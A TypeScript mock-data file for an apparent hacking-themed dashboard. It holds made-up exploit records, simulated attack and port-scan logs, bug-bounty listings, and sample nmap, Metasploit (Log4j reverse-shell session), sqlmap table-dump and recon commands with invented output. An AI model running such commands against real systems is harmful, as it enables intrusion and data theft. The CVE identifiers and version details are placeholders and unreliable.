/**
 * Mock Data for CyberStrike Dashboard
 * Realistic simulation data for exploits, attacks, bounties, and terminal commands
 */

// ============================================
// 1. EXPLOIT DATA
// ============================================

export interface Exploit {
  id: string;
  cve: string;
  name: string;
  severity: 'Critical' | 'High' | 'Medium' | 'Low';
  targetSystem: string;
  successRate: number;
  description: string;
  lastSeen: Date;
  affectedVersions: string[];
  exploitType: 'RCE' | 'SQLi' | 'XSS' | 'CSRF' | 'SSRF' | 'LFI' | 'RFI' | 'Buffer Overflow';
}

export const mockExploits: Exploit[] = [
  {
    id: 'exp-001',
    cve: 'CVE-2024-1234',
    name: 'Apache Log4j2 Remote Code Execution',
    severity: 'Critical',
    targetSystem: 'Apache Server 2.17.0',
    successRate: 87.5,
    description: 'Remote code execution vulnerability in Apache Log4j2 via JNDI lookup',
    lastSeen: new Date('2024-01-15'),
    affectedVersions: ['2.0.0 - 2.17.0'],
    exploitType: 'RCE',
  },
  {
    id: 'exp-002',
    cve: 'CVE-2024-5678',
    name: 'WordPress SQL Injection',
    severity: 'High',
    targetSystem: 'WordPress 5.8.0',
    successRate: 72.3,
    description: 'SQL injection vulnerability in WordPress user authentication',
    lastSeen: new Date('2024-01-20'),
    affectedVersions: ['5.0.0 - 5.8.0'],
    exploitType: 'SQLi',
  },
  {
    id: 'exp-003',
    cve: 'CVE-2024-9012',
    name: 'Cross-Site Scripting (XSS)',
    severity: 'Medium',
    targetSystem: 'Custom Web Application',
    successRate: 65.8,
    description: 'Stored XSS vulnerability in user comment system',
    lastSeen: new Date('2024-01-22'),
    affectedVersions: ['v1.0 - v2.3'],
    exploitType: 'XSS',
  },
  {
    id: 'exp-004',
    cve: 'CVE-2024-3456',
    name: 'Server-Side Request Forgery',
    severity: 'High',
    targetSystem: 'Internal API Gateway',
    successRate: 81.2,
    description: 'SSRF vulnerability allowing internal network access',
    lastSeen: new Date('2024-01-18'),
    affectedVersions: ['v3.1.0 - v3.5.2'],
    exploitType: 'SSRF',
  },
  {
    id: 'exp-005',
    cve: 'CVE-2024-7890',
    name: 'Local File Inclusion',
    severity: 'Medium',
    targetSystem: 'PHP Application 7.4',
    successRate: 58.9,
    description: 'LFI vulnerability in file upload handler',
    lastSeen: new Date('2024-01-21'),
    affectedVersions: ['7.0.0 - 7.4.33'],
    exploitType: 'LFI',
  },
  {
    id: 'exp-006',
    cve: 'CVE-2024-2468',
    name: 'Buffer Overflow in FTP Server',
    severity: 'Critical',
    targetSystem: 'vsftpd 3.0.3',
    successRate: 93.1,
    description: 'Stack-based buffer overflow in FTP command handler',
    lastSeen: new Date('2024-01-19'),
    affectedVersions: ['3.0.0 - 3.0.3'],
    exploitType: 'Buffer Overflow',
  },
  {
    id: 'exp-007',
    cve: 'CVE-2024-1357',
    name: 'Remote File Inclusion',
    severity: 'High',
    targetSystem: 'PHP Application 8.0',
    successRate: 69.4,
    description: 'RFI vulnerability allowing remote code execution',
    lastSeen: new Date('2024-01-20'),
    affectedVersions: ['8.0.0 - 8.1.5'],
    exploitType: 'RFI',
  },
  {
    id: 'exp-008',
    cve: 'CVE-2024-9753',
    name: 'Cross-Site Request Forgery',
    severity: 'Medium',
    targetSystem: 'Admin Panel v2.0',
    successRate: 54.2,
    description: 'CSRF vulnerability in admin action handlers',
    lastSeen: new Date('2024-01-17'),
    affectedVersions: ['1.5.0 - 2.0.0'],
    exploitType: 'CSRF',
  },
];

// ============================================
// 2. LIVE ATTACK DATA
// ============================================

export interface LiveAttack {
  id: string;
  timestamp: Date;
  sourceIP: string;
  targetIP: string;
  targetPort: number;
  payloadType: string;
  responseTime: number; // in milliseconds
  status: 'success' | 'blocked' | 'failed' | 'pending';
  protocol: 'TCP' | 'UDP' | 'HTTP' | 'HTTPS';
  attackType: string;
  userAgent?: string;
}

export const mockLiveAttacks: LiveAttack[] = [
  {
    id: 'atk-001',
    timestamp: new Date(),
    sourceIP: '192.168.45.123',
    targetIP: '10.0.0.45',
    targetPort: 8080,
    payloadType: 'SQL Injection',
    responseTime: 234,
    status: 'success',
    protocol: 'HTTP',
    attackType: 'SQLi',
    userAgent: 'Mozilla/5.0 (X11; Linux x86_64)',
  },
  {
    id: 'atk-002',
    timestamp: new Date(Date.now() - 2000),
    sourceIP: '203.0.113.45',
    targetIP: '10.0.0.12',
    targetPort: 443,
    payloadType: 'XSS Payload',
    responseTime: 156,
    status: 'blocked',
    protocol: 'HTTPS',
    attackType: 'XSS',
    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
  },
  {
    id: 'atk-003',
    timestamp: new Date(Date.now() - 5000),
    sourceIP: '198.51.100.78',
    targetIP: '10.0.0.89',
    targetPort: 22,
    payloadType: 'SSH Brute Force',
    responseTime: 1234,
    status: 'failed',
    protocol: 'TCP',
    attackType: 'Brute Force',
  },
  {
    id: 'atk-004',
    timestamp: new Date(Date.now() - 8000),
    sourceIP: '172.16.0.42',
    targetIP: '10.0.0.67',
    targetPort: 3306,
    payloadType: 'MySQL Injection',
    responseTime: 89,
    status: 'success',
    protocol: 'TCP',
    attackType: 'SQLi',
  },
  {
    id: 'atk-005',
    timestamp: new Date(Date.now() - 12000),
    sourceIP: '192.0.2.156',
    targetIP: '10.0.0.23',
    targetPort: 80,
    payloadType: 'Command Injection',
    responseTime: 312,
    status: 'blocked',
    protocol: 'HTTP',
    attackType: 'RCE',
    userAgent: 'curl/7.68.0',
  },
  {
    id: 'atk-006',
    timestamp: new Date(Date.now() - 15000),
    sourceIP: '203.0.113.201',
    targetIP: '10.0.0.91',
    targetPort: 443,
    payloadType: 'SSRF Payload',
    responseTime: 445,
    status: 'success',
    protocol: 'HTTPS',
    attackType: 'SSRF',
    userAgent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
  },
  {
    id: 'atk-007',
    timestamp: new Date(Date.now() - 18000),
    sourceIP: '198.51.100.234',
    targetIP: '10.0.0.34',
    targetPort: 8080,
    payloadType: 'Path Traversal',
    responseTime: 267,
    status: 'blocked',
    protocol: 'HTTP',
    attackType: 'LFI',
    userAgent: 'python-requests/2.28.1',
  },
  {
    id: 'atk-008',
    timestamp: new Date(Date.now() - 21000),
    sourceIP: '172.16.0.99',
    targetIP: '10.0.0.56',
    targetPort: 5432,
    payloadType: 'PostgreSQL Injection',
    responseTime: 178,
    status: 'failed',
    protocol: 'TCP',
    attackType: 'SQLi',
  },
];

// Port scanning data
export interface PortScan {
  id: string;
  timestamp: Date;
  sourceIP: string;
  targetIP: string;
  ports: number[];
  scanType: 'SYN' | 'TCP' | 'UDP' | 'FIN' | 'Xmas';
  duration: number; // in seconds
  openPorts: number[];
  filteredPorts: number[];
  closedPorts: number[];
}

export const mockPortScans: PortScan[] = [
  {
    id: 'scan-001',
    timestamp: new Date(Date.now() - 30000),
    sourceIP: '192.168.1.100',
    targetIP: '10.0.0.50',
    ports: [22, 80, 443, 3306, 5432, 8080, 8443],
    scanType: 'SYN',
    duration: 12.5,
    openPorts: [22, 80, 443, 8080],
    filteredPorts: [3306],
    closedPorts: [5432, 8443],
  },
  {
    id: 'scan-002',
    timestamp: new Date(Date.now() - 60000),
    sourceIP: '203.0.113.50',
    targetIP: '10.0.0.75',
    ports: Array.from({ length: 1000 }, (_, i) => i + 1),
    scanType: 'TCP',
    duration: 45.8,
    openPorts: [21, 22, 25, 53, 80, 443, 993, 995],
    filteredPorts: [135, 139, 445],
    closedPorts: Array.from({ length: 989 }, (_, i) => i + 1).filter(
      (p) => ![21, 22, 25, 53, 80, 443, 135, 139, 445, 993, 995].includes(p)
    ),
  },
];

// ============================================
// 3. BOUNTY PROGRAM DATA
// ============================================

export interface BountyProgram {
  id: string;
  platform: string;
  programName: string;
  reward: {
    min: number;
    max: number;
    average: number;
    currency: string;
  };
  difficulty: 'Easy' | 'Medium' | 'Hard' | 'Expert';
  targetTypes: string[];
  status: 'Active' | 'Paused' | 'Closed';
  submissionCount: number;
  acceptanceRate: number; // percentage
  avgResponseTime: number; // in hours
  website: string;
}

export const mockBountyPrograms: BountyProgram[] = [
  {
    id: 'bounty-001',
    platform: 'HackerOne',
    programName: 'TechCorp Security Program',
    reward: {
      min: 100,
      max: 50000,
      average: 2500,
      currency: 'USD',
    },
    difficulty: 'Medium',
    targetTypes: ['Web Application', 'Mobile App', 'API'],
    status: 'Active',
    submissionCount: 1247,
    acceptanceRate: 68.5,
    avgResponseTime: 48,
    website: 'https://hackerone.com/techcorp',
  },
  {
    id: 'bounty-002',
    platform: 'Bugcrowd',
    programName: 'FinanceApp Bug Bounty',
    reward: {
      min: 500,
      max: 100000,
      average: 8500,
      currency: 'USD',
    },
    difficulty: 'Hard',
    targetTypes: ['Web Application', 'Mobile App iOS', 'Mobile App Android'],
    status: 'Active',
    submissionCount: 892,
    acceptanceRate: 45.2,
    avgResponseTime: 72,
    website: 'https://bugcrowd.com/financeapp',
  },
  {
    id: 'bounty-003',
    platform: 'HackerOne',
    programName: 'StartupXYZ Vulnerability Program',
    reward: {
      min: 50,
      max: 10000,
      average: 1200,
      currency: 'USD',
    },
    difficulty: 'Easy',
    targetTypes: ['Web Application'],
    status: 'Active',
    submissionCount: 234,
    acceptanceRate: 78.3,
    avgResponseTime: 24,
    website: 'https://hackerone.com/startupxyz',
  },
  {
    id: 'bounty-004',
    platform: 'Bugcrowd',
    programName: 'Enterprise Inc. Security',
    reward: {
      min: 1000,
      max: 250000,
      average: 15000,
      currency: 'USD',
    },
    difficulty: 'Expert',
    targetTypes: ['Web Application', 'API', 'Infrastructure', 'Mobile App'],
    status: 'Active',
    submissionCount: 2156,
    acceptanceRate: 32.1,
    avgResponseTime: 120,
    website: 'https://bugcrowd.com/enterprise',
  },
  {
    id: 'bounty-005',
    platform: 'Intigriti',
    programName: 'CloudService Platform',
    reward: {
      min: 200,
      max: 75000,
      average: 5000,
      currency: 'EUR',
    },
    difficulty: 'Medium',
    targetTypes: ['Web Application', 'API', 'Cloud Infrastructure'],
    status: 'Active',
    submissionCount: 567,
    acceptanceRate: 61.4,
    avgResponseTime: 36,
    website: 'https://intigriti.com/cloudservice',
  },
  {
    id: 'bounty-006',
    platform: 'HackerOne',
    programName: 'Government Portal',
    reward: {
      min: 100,
      max: 20000,
      average: 3000,
      currency: 'USD',
    },
    difficulty: 'Hard',
    targetTypes: ['Web Application', 'API'],
    status: 'Active',
    submissionCount: 1456,
    acceptanceRate: 52.8,
    avgResponseTime: 96,
    website: 'https://hackerone.com/govportal',
  },
];

// ============================================
// 4. TERMINAL COMMANDS & OUTPUTS
// ============================================

export interface TerminalCommand {
  id: string;
  command: string;
  description: string;
  output: string;
  timestamp: Date;
  category: 'recon' | 'exploit' | 'post-exploit' | 'scanning';
}

// Nmap Commands
export const nmapCommands: TerminalCommand[] = [
  {
    id: 'cmd-nmap-001',
    command: 'nmap -sS -p 1-1000 -T4 192.168.1.100',
    description: 'SYN scan on ports 1-1000',
    category: 'scanning',
    timestamp: new Date(),
    output: `Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-23 10:30:00 UTC
Nmap scan report for 192.168.1.100
Host is up (0.023s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
3306/tcp open  mysql
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 12.34 seconds`,
  },
  {
    id: 'cmd-nmap-002',
    command: 'nmap -sV -sC -O 10.0.0.50',
    description: 'Version detection and OS detection',
    category: 'scanning',
    timestamp: new Date(),
    output: `Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-23 10:35:15 UTC
Nmap scan report for 10.0.0.50
Host is up (0.015s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Welcome to Apache
443/tcp open  ssl/http Apache httpd 2.4.41
|_ssl-date: TLS randomness does not represent time
|_http-title: Welcome to Apache
OS details: Linux 5.4.0 - 5.5.0
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results.`,
  },
  {
    id: 'cmd-nmap-003',
    command: 'nmap --script vuln 192.168.1.100',
    description: 'Vulnerability scan',
    category: 'scanning',
    timestamp: new Date(),
    output: `Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-23 10:40:30 UTC
Pre-scan script results:
| broadcast-avahi-dos:
|   VULNERABLE:
|   Avahi mDNS reflection attack
|     State: VULNERABLE
|     IDs:  CVE:CVE-2015-2809
|
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
| http-slowloris-check:
|   VULNERABLE:
|   Slowloris DoS attack
|     State: VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|
Nmap scan report for 192.168.1.100
Host script results:
|_smb-vuln-ms17-010: NT_STATUS_ACCESS_DENIED`,
  },
];

// Metasploit Commands
export const metasploitCommands: TerminalCommand[] = [
  {
    id: 'cmd-msf-001',
    command: 'msfconsole -q',
    description: 'Start Metasploit console',
    category: 'exploit',
    timestamp: new Date(),
    output: `msf6 > use exploit/linux/http/apache_log4j_rce
[*] Using configured payload linux/x86/meterpreter/reverse_tcp
msf6 exploit(linux/http/apache_log4j_rce) > set RHOSTS 192.168.1.100
RHOSTS => 192.168.1.100
msf6 exploit(linux/http/apache_log4j_rce) > set LHOST 192.168.1.50
LHOST => 192.168.1.50
msf6 exploit(linux/http/apache_log4j_rce) > exploit

[*] Started reverse TCP handler on 192.168.1.50:4444
[*] Sending payload...
[*] Sending stage (984904 bytes) to 192.168.1.100
[*] Meterpreter session 1 opened (192.168.1.50:4444 -> 192.168.1.100:54321) at 2024-01-23 10:45:00 UTC

meterpreter >`,
  },
  {
    id: 'cmd-msf-002',
    command: 'search exploit wordpress',
    description: 'Search for WordPress exploits',
    category: 'exploit',
    timestamp: new Date(),
    output: `Matching Modules
================

   #  Name                                          Disclosure Date  Rank       Check  Description
   -  ----                                          ---------------  ----       -----  -----------
   0  exploit/unix/webapp/wp_admin_shell_upload     2012-06-21       excellent  Yes   WordPress Admin Shell Upload
   1  exploit/multi/http/wp_custom_contact_form    2013-01-03       excellent  Yes   WordPress Plugin Custom Contact Forms SQL Injection
   2  exploit/multi/http/wp_wpfilemanager_rce      2020-09-09       excellent  Yes   WordPress File Manager Unauthenticated RCE
   3  exploit/unix/webapp/wp_plainview_activity     2012-11-13       excellent  Yes   WordPress Plainview Activity Monitor RCE

Interact with a module by name or index, for example: use 0`,
  },
  {
    id: 'cmd-msf-003',
    command: 'sessions -l',
    description: 'List active sessions',
    category: 'post-exploit',
    timestamp: new Date(),
    output: `Active sessions
==============

  Id  Name  Type                     Information                       Connection
  --  ----  ----                     -----------                       ----------
  1         meterpreter x86/linux    uid=33, gid=33 @ 192.168.1.100    192.168.1.50:4444 -> 192.168.1.100:54321 (192.168.1.100)`,
  },
];

// SQLMap Commands
export const sqlmapCommands: TerminalCommand[] = [
  {
    id: 'cmd-sqlmap-001',
    command: 'sqlmap -u "http://target.com/page?id=1" --batch --dbs',
    description: 'Enumerate databases',
    category: 'exploit',
    timestamp: new Date(),
    output: `[10:50:00] [INFO] testing connection to the target URL
[10:50:01] [INFO] checking if the target is protected by some kind of WAF/IPS
[10:50:02] [INFO] testing if the target URL content is stable
[10:50:03] [INFO] target URL content is stable
[10:50:04] [INFO] testing if GET parameter 'id' is dynamic
[10:50:05] [INFO] confirming that GET parameter 'id' is injectable
[10:50:06] [INFO] GET parameter 'id' is 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[10:50:07] [INFO] fetching database names
[10:50:08] [INFO] retrieved: information_schema
[10:50:09] [INFO] retrieved: mysql
[10:50:10] [INFO] retrieved: webapp_db
[10:50:11] [INFO] retrieved: test_db
available databases [4]:
[*] information_schema
[*] mysql
[*] webapp_db
[*] test_db`,
  },
  {
    id: 'cmd-sqlmap-002',
    command: 'sqlmap -u "http://target.com/page?id=1" -D webapp_db --tables',
    description: 'List tables in database',
    category: 'exploit',
    timestamp: new Date(),
    output: `[10:55:00] [INFO] the back-end DBMS is MySQL
[10:55:01] [INFO] fetching tables for database: 'webapp_db'
[10:55:02] [INFO] fetching number of tables for database 'webapp_db'
[10:55:03] [INFO] retrieved: 5
[10:55:04] [INFO] retrieved: users
[10:55:05] [INFO] retrieved: products
[10:55:06] [INFO] retrieved: orders
[10:55:07] [INFO] retrieved: sessions
[10:55:08] [INFO] retrieved: logs
Database: webapp_db
[5 tables]
+----------+
| users    |
| products |
| orders   |
| sessions |
| logs     |
+----------+`,
  },
  {
    id: 'cmd-sqlmap-003',
    command: 'sqlmap -u "http://target.com/page?id=1" -D webapp_db -T users --dump',
    description: 'Dump user table',
    category: 'exploit',
    timestamp: new Date(),
    output: `[11:00:00] [INFO] fetching columns for table 'users' in database 'webapp_db'
[11:00:01] [INFO] retrieved: id, username, email, password_hash, created_at
[11:00:02] [INFO] fetching entries for table 'users' in database 'webapp_db'
[11:00:03] [INFO] retrieved: 3
[11:00:04] [INFO] analyzing table dump for possible password hashes
Database: webapp_db
Table: users
[3 entries]
+----+----------+------------------+----------------------------------+---------------------+
| id | username | email            | password_hash                     | created_at          |
+----+----------+------------------+----------------------------------+---------------------+
| 1  | admin    | admin@test.com   | 5f4dcc3b5aa765d61d8327deb882cf99 | 2023-01-15 10:00:00 |
| 2  | user1    | user1@test.com   | e10adc3949ba59abbe56e057f20f883e | 2023-02-20 14:30:00 |
| 3  | guest    | guest@test.com   | 098f6bcd4621d373cade4e832627b4f6 | 2023-03-10 09:15:00 |
+----+----------+------------------+----------------------------------+---------------------+`,
  },
];

// Recon Commands
export const reconCommands: TerminalCommand[] = [
  {
    id: 'cmd-recon-001',
    command: 'subfinder -d example.com -o subdomains.txt',
    description: 'Find subdomains',
    category: 'recon',
    timestamp: new Date(),
    output: `[INF] Using config file: /home/user/.config/subfinder/config.yaml
[INF] Enumerating subdomains for example.com
[INF] Found 127 subdomains

www.example.com
api.example.com
admin.example.com
staging.example.com
dev.example.com
mail.example.com
ftp.example.com
...`,
  },
  {
    id: 'cmd-recon-002',
    command: 'masscan -p1-65535 192.168.1.0/24 --rate=1000',
    description: 'Fast port scan',
    category: 'scanning',
    timestamp: new Date(),
    output: `Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2024-01-23 11:05:00 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 256 hosts [65536 ports/host]
Discovered open port 22/tcp on 192.168.1.100
Discovered open port 80/tcp on 192.168.1.100
Discovered open port 443/tcp on 192.168.1.100
Discovered open port 3306/tcp on 192.168.1.50
Discovered open port 8080/tcp on 192.168.1.75
...`,
  },
];

// Combine all commands
export const allTerminalCommands: TerminalCommand[] = [
  ...nmapCommands,
  ...metasploitCommands,
  ...sqlmapCommands,
  ...reconCommands,
];

// ============================================
// HELPER FUNCTIONS
// ============================================

/**
 * Get random exploit
 */
export function getRandomExploit(): Exploit {
  return mockExploits[Math.floor(Math.random() * mockExploits.length)];
}

/**
 * Get random attack
 */
export function getRandomAttack(): LiveAttack {
  return mockLiveAttacks[Math.floor(Math.random() * mockLiveAttacks.length)];
}

/**
 * Get random bounty program
 */
export function getRandomBountyProgram(): BountyProgram {
  return mockBountyPrograms[Math.floor(Math.random() * mockBountyPrograms.length)];
}

/**
 * Get random terminal command
 */
export function getRandomTerminalCommand(): TerminalCommand {
  return allTerminalCommands[Math.floor(Math.random() * allTerminalCommands.length)];
}

/**
 * Generate new live attack (for real-time simulation)
 */
export function generateNewLiveAttack(): LiveAttack {
  const sourceIPs = [
    '192.168.45.123',
    '203.0.113.45',
    '198.51.100.78',
    '172.16.0.42',
    '192.0.2.156',
    '203.0.113.201',
    '198.51.100.234',
    '172.16.0.99',
  ];
  
  const targetIPs = Array.from({ length: 100 }, (_, i) => `10.0.0.${i + 1}`);
  const ports = [22, 80, 443, 3306, 5432, 8080, 8443, 3389, 5900];
  const payloadTypes = [
    'SQL Injection',
    'XSS Payload',
    'Command Injection',
    'SSRF Payload',
    'Path Traversal',
    'RCE Payload',
    'XXE Payload',
    'CSRF Token Bypass',
  ];
  const statuses: LiveAttack['status'][] = ['success', 'blocked', 'failed', 'pending'];
  const protocols: LiveAttack['protocol'][] = ['TCP', 'UDP', 'HTTP', 'HTTPS'];
  const attackTypes = ['SQLi', 'XSS', 'RCE', 'SSRF', 'LFI', 'RFI', 'CSRF', 'Brute Force'];

  return {
    id: `atk-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
    timestamp: new Date(),
    sourceIP: sourceIPs[Math.floor(Math.random() * sourceIPs.length)],
    targetIP: targetIPs[Math.floor(Math.random() * targetIPs.length)],
    targetPort: ports[Math.floor(Math.random() * ports.length)],
    payloadType: payloadTypes[Math.floor(Math.random() * payloadTypes.length)],
    responseTime: Math.floor(Math.random() * 1000) + 50,
    status: statuses[Math.floor(Math.random() * statuses.length)],
    protocol: protocols[Math.floor(Math.random() * protocols.length)],
    attackType: attackTypes[Math.floor(Math.random() * attackTypes.length)],
    userAgent: Math.random() > 0.5 ? 'Mozilla/5.0 (compatible; bot)' : undefined,
  };
}

